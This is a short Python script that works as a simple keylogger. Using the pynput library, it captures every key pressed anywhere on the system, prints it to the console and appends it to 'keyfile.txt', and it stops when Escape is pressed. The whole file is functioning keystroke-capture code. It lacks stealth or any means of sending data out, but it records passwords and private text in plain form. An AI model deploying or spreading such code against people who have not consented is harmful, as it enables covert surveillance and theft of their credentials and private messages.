from pynput import keyboard
import datetime

def key_pressed(key):
    try:
        char = key.char
        if char is not None: 
            print(char, end='', flush=True)  
            with open("keyfile.txt", 'a') as log_key:
                log_key.write(char)
    except AttributeError:
        print(f"[{key}]", end='', flush=True)  
        with open("keyfile.txt", 'a') as log_key:
            log_key.write(f"[{key}]")
        if key == keyboard.Key.esc:
            print("Escape pressed, exiting...")
            return False

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    listener.join()  

